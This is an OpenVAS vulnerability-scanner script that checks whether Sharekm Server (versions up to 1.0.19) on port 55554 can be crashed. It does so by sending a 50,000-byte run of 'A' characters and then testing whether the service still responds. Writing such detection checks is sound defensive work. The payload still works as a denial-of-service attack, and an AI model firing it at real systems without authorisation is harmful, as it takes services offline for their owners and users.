###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sharekm_server_dos_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Sharekm Server Remote Denial Of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");

if(description)
{
  script_id(803762);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-09-23 15:05:45 +0530 (Mon, 23 Sep 2013)");
  script_name("Sharekm Server Remote Denial Of Service Vulnerability");

   tag_summary =
"This host is running Sharekm Server and is prone to denial of service
vulnerability.";

  tag_vuldetect =
"Send crafted request and check is it vulnerable to DoS or not.";

  tag_insight =
"The flaw is due to an error when handling specially crafted requests which can
be exploited to crash the server.";

  tag_impact =
"Successful exploitation will allow remote attacker to cause a denial of service.

Impact Level: Application";

  tag_affected =
"Share KM versions 1.0.19 and prior.";

  tag_solution =
"No solution or patch is available as of 23rd September, 2013. Information
regarding this issue will be updated once the solution details are available.
For updates refer to https://sites.google.com/site/droidskm";

 desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "impact" , value : tag_impact);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/28451");
  script_summary("Check if Sharekm Server is vulnerable to denial of service");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_require_ports(55554);
  exit(0);
}


soc = "";
req = "";
recv = "";

## Sharekm Server default port
frcviPort = 55554;

## Check the port status
if(!get_port_state(frcviPort)){
  exit(0);
}

## exit if socket is not created
soc = open_sock_tcp(frcviPort);
if(!soc){
  exit(0);
}

## Application confirmation is not possible
send(socket:soc, data:"GET / HTTP1.1\r\n");
recv = recv(socket:soc, length:1024);
if(!recv)
{
  close(soc);
  exit(0);
}

## Construct an attack request
req = crap(data: "A", length:50000);

## Sending Request
send(socket:soc, data:req);
close(soc);

sleep(2);

## check the port and confirmed the crash or not
soc = open_sock_tcp(frcviPort);
if(!soc)
{
  security_hole(frcviPort);
  exit(0);
}
else
{
  ## check the response and confirme the crash or not
  send(socket:soc, data:"GET / HTTP1.1\r\n");
  recv = recv(socket:soc, length:1024);
  if(!recv)
  {
   close(soc);
   security_hole(frcviPort);
   exit(0);

  }
  close(soc);
}
